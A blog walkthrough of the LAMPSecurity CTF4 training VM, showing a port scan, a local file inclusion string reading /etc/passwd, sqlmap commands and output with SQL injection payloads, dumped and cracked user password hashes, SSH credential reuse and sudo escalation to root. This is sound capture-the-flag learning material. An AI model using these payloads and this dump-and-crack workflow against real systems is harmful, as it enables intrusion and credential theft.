---
layout: blog_item
title:  "LAMP Security CTF4 - Walkthrough"
date:   2014-01-10 18:00:10
author: Arr0way
description: 'LAMP Security CTF 4 - Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products. Please note there are other capture the flag exercises (not just the latest one). Check the SourceForge site to find other exercises available (http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/).

**Author:** madirish2600

**Download:** [VulnHub](https://www.vulnhub.com


## Enumeration

### Port Scanning

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.30.147

{% endhighlight %}

<div class="note info">
  <h5>Dislcaimer: Multiple Entry Points</h5>
  <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the **web application** as the entry point.</p>
</div>

### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 4.3 (protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 25</code></p></pc>
           </td>
           <td>
              <pc><p>SMTP</p></pc>
           </td>
           <td>
               <pc><p>Sendmail 8.13.5/8.13.5</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTPD</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.0 ((Fedora))</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

### HTTP Enumeration

Inspection of the Web Application revealed the blog used GET requests.

#### LFI Exploit

The string <code>index.html?page=../../../../../../etc/passwd%00</code> exposed the contents on the unix passwd file.

![OWASP DirBuster](/img/blog/ctf4/LFI.png)

RFI did not appear possible.


## SQLMap Enumeration

SQLMap was leveraged to enumerate, inject and dump the MySQL databases on the target.

### SQLMap

Using the GET 'id' as the injection point, the following SQLMap command was used to successfully list tables for all databases on the target system.

{% highlight bash %}
sqlmap -u "http://192.168.30.147/index.html?page=blog&title=Blog&id=2" -p id --tables
{% endhighlight %}

Full SQLMap Command Output:

{% highlight bash %}

_
___ ___| |_____ ___ ___  {1.0-dev-nongit-20150826}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
|_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:05:38

[12:05:38] [INFO] testing connection to the target URL
[12:05:38] [INFO] testing if the target URL is stable
[12:05:39] [INFO] target URL is stable
[12:05:39] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:05:39] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:05:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:05:57] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[12:05:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[12:05:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[12:05:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:05:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:05:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:05:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:05:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[12:05:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING clause (BIGINT UNSIGNED)'
[12:05:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[12:05:57] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING clause'
[12:05:57] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
[12:05:57] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[12:05:57] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
[12:05:57] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[12:05:57] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[12:05:57] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[12:05:57] [INFO] testing 'MySQL inline queries'
[12:05:57] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
[12:05:57] [WARNING] time-based comparison requires larger statistical model, please wait....                                                                                         
[12:05:57] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'
[12:05:57] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[12:05:57] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[12:05:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[12:05:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[12:05:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
[12:06:08] [INFO] GET parameter 'id' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable
[12:06:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:06:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:06:08] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:06:08] [INFO] target URL appears to have 5 columns in query
[12:06:08] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
---
Parameter: id (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: page=blog&title=Blog&id=2 AND 7114=7114

Type: AND/OR time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
Payload: page=blog&title=Blog&id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))kOtW)

Type: UNION query
Title: Generic UNION query (NULL) - 5 columns
Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162707871,0x4f75614351414f4d6e69,0x7176717671),NULL--
---
[12:06:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 5 (Bordeaux)
web application technology: Apache 2.2.0, PHP 5.1.2
back-end DBMS: MySQL 5.0.12
[12:06:31] [INFO] fetching database names
[12:06:31] [INFO] fetching tables for databases: 'calendar, ehks, information_schema, mysql, roundcubemail, test'
Database: calendar
[5 tables]
+---------------------------------------+
| phpc_calendars                        |
| phpc_events                           |
| phpc_sequence                         |
| phpc_users                            |
| uid                                   |
+---------------------------------------+

Database: roundcubemail
[6 tables]
+---------------------------------------+
| session                               |
| cache                                 |
| contacts                              |
| identities                            |
| messages                              |
| users                                 |
+---------------------------------------+

Database: ehks
[3 tables]
+---------------------------------------+
| user                                  |
| blog                                  |
| comment                               |
+---------------------------------------+

Database: information_schema
[16 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| KEY_COLUMN_USAGE                      |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+

Database: mysql
[17 tables]
+---------------------------------------+
| user                                  |
| columns_priv                          |
| db                                    |
| func                                  |
| help_category                         |
| help_keyword                          |
| help_relation                         |
| help_topic                            |
| host                                  |
| proc                                  |
| procs_priv                            |
| tables_priv                           |
| time_zone                             |
| time_zone_leap_second                 |
| time_zone_name                        |
| time_zone_transition                  |
| time_zone_transition_type             |
+---------------------------------------+

{% endhighlight %}

### SQLMap Dump Hahes + Crack hashes

{% highlight bash %}
sqlmap -u "http://192.168.30.147/index.html?page=blog&title=Blog&id=2" -p id -D ehks -T user  --dump
{% endhighlight %}


{% highlight bash %}

_
___ ___| |_____ ___ ___  {1.0-dev-nongit-20150826}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
|_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:15:25

[12:15:25] [INFO] resuming back-end DBMS 'mysql'
[12:15:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: page=blog&title=Blog&id=2 AND 7114=7114

Type: AND/OR time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
Payload: page=blog&title=Blog&id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))kOtW)

Type: UNION query
Title: Generic UNION query (NULL) - 5 columns
Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162707871,0x4f75614351414f4d6e69,0x7176717671),NULL--
---
[12:15:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 5 (Bordeaux)
web application technology: Apache 2.2.0, PHP 5.1.2
back-end DBMS: MySQL 5.0.12
[12:15:25] [INFO] fetching columns for table 'user' in database 'ehks'
[12:15:25] [INFO] fetching entries for table 'user' in database 'ehks'
[12:15:25] [INFO] analyzing table dump for possible password hashes
[12:15:25] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
do you want to crack them via a dictionary-based attack? [Y/n/q]
[12:15:34] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
[12:15:35] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N]
[12:15:36] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[12:15:36] [INFO] starting 4 processes
[12:15:37] [INFO] cracked password 'Homesite' for user 'pmoore'                                                                                                                       
[12:15:38] [INFO] cracked password 'Sue1978' for user 'jdurbin'                                                                                                                       
[12:15:39] [INFO] cracked password 'ilike2surf' for user 'dstevens'                                                                                                                   
[12:15:42] [INFO] cracked password 'pacman' for user 'sorzek'                                                                                                                         
[12:15:42] [INFO] cracked password 'undone1' for user 'ghighland'                                                                                                                     
[12:15:43] [INFO] cracked password 'seventysixers' for user 'achen'                                                                                                                   
[12:15:44] [INFO] postprocessing table dump                                                                                                                                           
Database: ehks
Table: user
[6 entries]
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+

[12:15:44] [WARNING] table 'ehks.`user`' dumped to CSV file '/root/.sqlmap/output/192.168.30.147/dump/ehks/user-f3649c95.csv'
[12:15:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.30.147'

{% endhighlight %}

## SSH Login

All the dumped accounts appeared to have matching SSH accounts sharing the same credentials as the vulnerable web application.

## Linux Local Privilege Escalation  

The account <code>achen</code> was a memeber of the sudo group.

The command <code>sudo -s</code> was executed, successfully escalating privileges to super user.

{% highlight bash %}

[achen@ctf4 ~]$ sudo -s
[root@ctf4 ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t:SystemLow-SystemHigh
[root@ctf4 ~]# cat /root/
{% endhighlight %}

## Post Exploitation Enumeration

There appears to be no root flag, for this capture the flag challenge.

Additionally <code>.bash_history</code> contained the root password:

{% highlight bash %}

[achen@ctf4 ~]$ cat .bash_history
exit
clear
exit
sudo sy
su
root1234
su
exit
{% endhighlight %}

Thanks for the VM :)
